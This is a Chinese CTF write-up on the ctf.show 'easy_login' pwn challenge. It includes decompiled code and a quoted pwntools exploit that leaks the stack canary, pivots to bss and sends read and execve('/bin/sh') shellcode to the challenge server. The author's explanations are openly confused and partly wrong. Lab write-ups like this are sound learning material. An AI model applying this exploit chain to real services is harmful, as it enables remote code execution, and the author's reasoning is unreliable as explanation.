# easy_login

[题目地址](https://ctf.show/challenges#easy_login-3833)

我去怎么看了wp都不懂。

-   Arch:     amd64-64-little
    <br>RELRO:    No RELRO
    <br>Stack:    Canary found
    <br>NX:       NX disabled
    <br>PIE:      No PIE (0x400000)
    <br>RWX:      Has RWX segments

很少见到防护开成这样的程序。观察一下main。

```c
undefined8 Main(void)

{
  undefined4 uVar1;
  int iVar2;
  long in_FS_OFFSET;
  undefined local_38 [40];
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  memset(local_38,0,0x20);
  FUN_0040096a();
  FUN_00400957();
  puts("welcome to the second challenge!\nwhat you need to do it to login successfully!");
  puts("then enjoy the game!");
  while (iVar2 = Login(), iVar2 != 0) {
    FUN_00400d03();
    GetInput(local_38,2);
    uVar1 = FUN_00400a23(local_38);
    switch(uVar1) {
    default:
      puts("Illegal input");
      break;
    case 1:
      FUN_00400d62();
      break;
    case 2:
      FUN_0040104d();
      break;
    case 3:
      FUN_00400eca();
      break;
    case 4:
      FUN_00401181();
      break;
    case 5:
      IsLogin = 0;
      IsAdmin = 0;
      memset(&DAT_006022e0,0,0x10);
      memset(&DAT_006022f0,0,0x10);
      break;
    case 6:
      FUN_004013bd();
      break;
    case 7:
      FUN_00401367();
    }
  }
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return 0;
}
```

这次学聪明了，程序里说这次的任务是login就不看别的了。

```c
undefined8 DoLogin(void)

{
  int iVar1;
  ssize_t sVar2;
  long in_FS_OFFSET;
  undefined8 name;
  undefined8 local_40;
  char local_38 [16];
  undefined8 password;
  undefined8 local_20;
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  memset(&name,0,0x10);
  memset(local_38,0,0x10);
  memset(&password,0,0x10);
  iVar1 = open("/dev/urandom",0);
  if (iVar1 < 1) {
    puts("open error!there is no such file!");
                    /* WARNING: Subroutine does not return */
    _exit(0);
  }
  sVar2 = read(iVar1,local_38,0x10);
  if (sVar2 < 1) {
    puts("Initialization error. Please check the equipment environment.");
                    /* WARNING: Subroutine does not return */
    _exit(0);
  }
  memset(&name,0,0x10);
  memset(&password,0,0x10);
  puts("please login first!");
  printf("name:       ");
  GetInput(&name,16);
  printf("password:   ");
  GetInput(&password,0x40);
  iVar1 = strcmp((char *)&name,"cat_loves_her");
  if (iVar1 == 0) {
    iVar1 = strcmp((char *)&password,local_38);
    if (iVar1 == 0) {
      IsAdmin = 1;
    }
    else {
      printf("the password %s is wrong!You can try again !",&password);
      printf("password:   ");
      GetInput(&password,0x40);
    }
  }
  IsLogin = 1;
  _DAT_006022e0 = name;
  _DAT_006022e8 = local_40;
  _DAT_006022f0 = password;
  _DAT_006022f8 = local_20;
  printf("%s,welcome to dreamcat\'s easy Databasesystem!\n",&name);
  puts("here you will learn how to play ctfpwn!");
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return 0;
}
```

password倒是有很明显的栈溢出，可以溢出到canary并在密码错误时的输出拿到canary。没开nx理论上可以直接ret2shellcode，可是没找到bss段（ghidra里显示bss段少了一部分！它不会显示程序中未加载的bss段，到0x0060233f就结束了……）。也不能ret2libc，似乎未绑定libc。新手杯难度变换坡度这么恐怖的吗？看眼wp。

```python
from pwn import *
context.arch='amd64'
#r=process('./pwn2')
r=remote("pwn.challenge.ctf.show",28105)
bss_addr = 0x602400
read_pwd = 0x400C7D

# gdb.attach(r,'b *0x400C89')
context.log_level = 'debug'

r.sendlineafter("name:",b'cat_loves_her')

r.sendlineafter("password:",b'X'*0x19)

r.recvuntil(b"X"*0x19)
canary = r.recv(7)
canary = b'\x00'+canary
r.sendlineafter("password:",b'X'*0x18+canary+p64(bss_addr)+p64(read_pwd))

shellcode = b'H\xc7\xc7\x00\x00\x00\x00H\xc7\xc6P$`\x00H1\xc0\x0f\x05\xe8X'
pad = shellcode.ljust(0x18,b'\x00')+canary+p64(bss_addr)
pad += p64(bss_addr-0x20)
r.sendline(pad)
r.sendline(b'jhH\xb8/bin///sPH\x89\xe7hri\x01\x01\x814$\x01\x01\x01\x011\xf6Vj\x08^H\x01\xe6VH\x89\xe61\xd2j;X\x0f\x05')

r.interactive()
```

!!!直接懵逼。canary之前都看得懂，但是canary之后跟bss_addr是什么意思啊？我怎么记得canary后面是rsp啊，有什么用吗？关键是我尝试把bss_addr换成别的还不行。好吧继续看下去，应该会执行read_pwd，不过当前函数还没有执行完成，有两次getinput，所以先sendline pad。shellcode的内容如下：

```python
shellcode = asm('''
        mov rdi, 0
        mov rsi, 0x602450
        xor rax, rax
        syscall

''')+b'\xe8\x58'
```

系统调用？[查阅](https://blog.csdn.net/qq_29343201/article/details/52209588)后得到系统调用号为0的是read，xor rax rax相当于mov rax 0。(我怀疑是我记错了，1是write，感觉更合理？而且read这参数也不够啊)\xe8\x58不知道是什么东西了。pad中把shellcode靠左对齐后拼上canary以及bss_addr，bss_addr-0x20，最后发送可以getshell的shellcode。

完全不懂。第一个shellcode如果可以直接执行的话，为什么不直接getshell？我能想到的唯一答案是长度不够,password只能输入0x40。我也不明白bss_addr怎么跳转过去的，这里不是rbp吗？我调试看发现下一个要执行的函数确实是read_pwd，那有什么用呢？不懂，真的不懂。可能当前程序所在栈直接可以执行，就不一定要bss了，所以可以执行编译的那段shellcode。我编不出来了。